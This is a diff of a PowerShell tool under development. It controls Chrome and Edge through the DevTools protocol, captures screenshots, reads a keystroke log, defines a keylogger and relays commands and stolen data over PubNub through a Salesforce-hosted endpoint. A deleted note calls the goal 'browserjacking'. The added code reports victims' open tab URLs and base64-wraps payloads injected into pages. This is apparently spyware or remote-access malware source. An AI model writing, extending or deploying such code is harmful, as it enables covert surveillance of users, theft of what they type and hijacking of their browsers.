@@ -1,18 +1,14 @@
 Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)
 
-# tasks for 20260923
-# figure out how to deal with using chrome both for pubnub comm as well as for 
-# browserjacking
-# --> should have two instances running, find
 
 $scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
-$createdNew = $false
-$script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)
+# $createdNew = $false
+# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)
 
-if (-not $createdNew) {
-    Write-Error "An instance of this script is already running. Exiting."
-    exit 1
-}
+#if (-not $createdNew) {
+    #Write-Error "An instance of this script is already running. Exiting."
+    #exit 1
+#}
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -166,6 +162,10 @@ function Take-Screenshot() {
     return $base64String
 }
 
+function Get-FrontendUrls() {
+    return $script:clientws.targets | ConvertTo-Json
+}
+
 function Get-KeyboardLog() {
     $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw
 
@@ -186,7 +186,8 @@ class PSCDPCommand {
     [scriptblock]$callback
     [bool]$isinvoked = $false
     [bool]$addsessionid = $false
-    
+    [bool]$iserror = $false
+
     [bool]HasCallback() {
         return ( $null -ne $this.callback )
     }
@@ -262,8 +263,9 @@ $script:SendPBMessage_callback = {
     param(
         [object]$Response, [PSCDP]$cdpobj
     )
-
+    
     Log-Msg "pass" 
+
 }
 
 $script:runtime_evaluate_callback = {
@@ -326,14 +328,25 @@ $script:get_targets_action = {
 function Process-PubNubEvent {
 
     param([string]$Message)
-    $payload = $Message | ConvertFrom-Json
-    Log-Msg $payload
+    $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
+    # Log-Msg $payload
 
     # GetScreenshot --> send back image as base64 string
 
     # GetFrontendUrls --> send back 
     #  $script:clientws.targets
-    
+
+    <#
+    $cmd = @{
+        builtincmd="GetFrontendUrls"
+        source="pscdp.relay.ps1"
+        destination="BROADCAST"
+        ts=$(Get-Timestamp)
+        cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
+    }
+    #>
+    $result = Get-FrontendUrls
+
     # --> write response back to pubnub 
     # $cdpobj.SendPBMessage("test 41234 $(Get-Timestamp)") 
     # $script:pubnubws.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true } } )
@@ -356,7 +369,7 @@ class PSCDP {
     $responses = [System.Collections.Generic.List[object]]::new()
     $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $results = [System.Collections.Generic.List[object]]::new()
-    $errors = [System.Collections.Generic.List[object]]::new()
+    $errors = [System.Collections.Generic.List[object]]::new() # TODO not implemented yet
 
     [int32]$messageId = 1
     $receiveNew = $true
@@ -370,6 +383,8 @@ class PSCDP {
     $addbinding_ok = $false
     $executionContextId = $null
 
+    # TODO need to track current active target, sessionId should be extracted from this active target
+    $activeTarge = $null # [PSCDPTarget]
     $sessionId = $null
     $initpage = $null
 
@@ -387,6 +402,11 @@ class PSCDP {
             throw 'websocket is not open'
         }
         
+        try {
+            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count)"
+        } catch {
+            Log-Msg "could not produce system overview message"
+        }
     }
 
     [bool] IsSocketHealthy() {
@@ -651,6 +671,33 @@ class PSCDP {
         }
     }
 
+    [bool] IsMessageError([hashtable]$msg) {
+
+        $iserror = $false
+
+        try {
+            if ( ! $msg.ContainsKey('result') ) {
+                throw ""
+            }
+    
+            if ( $msg.result.result.subtype -eq "error" ) {
+                $iserror = $true
+                throw ""
+            }
+    
+            if ( ! [string]::IsNullOrEmpty($msg.result.exceptionDetails.exceptionId) ) {
+                $iserror = $true
+                throw ""
+            }
+    
+    
+        } catch {
+            
+        }
+    
+        return $iserror
+    }
+
     [void] EndMessage() {
         if ( ! $this.result.EndOfMessage) {
             Log-Msg "... message is not complete -- skipping"
@@ -677,7 +724,7 @@ class PSCDP {
         try {
             $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
             
-            $iserror = $false # TODO add to errors list
+            $iserror = $false # TODO check if msg is an error and add to errors list
             $isresult = $false
             $newtarget = $false
             $bindingCalled = $false
@@ -715,13 +762,21 @@ class PSCDP {
                 }
             }
 
+            $iserror = $this.IsMessageError($msght)
+            if ( $iserror ) {
+                $this.errors.Add($msght)
+            }
+
             # check if msg is a response to an issued cmd
             if ( $isresult ) {
                 $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 
             
                 if ( $null -ne $cmd ) {
                     $cmd.response = $msght
+                    $cmd.iserror = $iserror
                 }
+
+                $msght.Add('cmd', $cmd)
 
                 $this.results.Add($msght)
             }
@@ -743,9 +798,7 @@ class PSCDP {
                 Log-Msg ($msght['params'].args | Out-String)
             }
 
-            if ( $iserror ) {
-                $this.errors.Add($msght)
-            }
+
 
             # TODO verify $msg has params, context, etc.
             if ( $executionContextCreated ) {
@@ -843,9 +896,11 @@ class PSCDP {
         }
 
         $json = $cmd | ConvertTo-Json # TODO wrap in try catch and report error as needed
+        $tbytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+        $jsonb = "`"" + [System.Convert]::ToBase64String($tbytes) + "`""
 
         $params = @{
-            functionDeclaration="let tpayload=$json; function f() { sendMessage(tpayload); }"
+            functionDeclaration="function f() { let tpayload=JSON.parse(atob($jsonb)); sendMessage(tpayload); }"
             executionContextId=$this.executionContextId
             returnByValue=$true
         }
@@ -874,7 +929,7 @@ class PSCDP {
 $script:clientws = [PSCDP]::new($script:chrome_debugport)
 $script:clientws.ConnectCdp()
 
-$script:pubnubws = [PSCDP]::new($script:chrome_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
+$script:pubnubws = [PSCDP]::new($script:msedge_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
 $script:pubnubws.LoadQueue()
 $script:pubnubws.ConnectCdp()
 
@@ -891,14 +946,14 @@ $keyboardlogger = {
     }
 }
 
-$ps = [powershell]::Create().AddScript($keyboardlogger)
-$asyncResult = $ps.BeginInvoke()
+# $ps = [powershell]::Create().AddScript($keyboardlogger)
+# $asyncResult = $ps.BeginInvoke()
 
 while ( $true ) {
 
     Log-Msg "new iteration"
 
-    $script:pubnubws.CheckSocket()
+    $script:pubnubws.CheckSocket() # report basic statistics: number of messages sent, received, errors, responses, results, etc.
 
     $script:pubnubws.InitReceive()
     $script:pubnubws.ReadMessage()
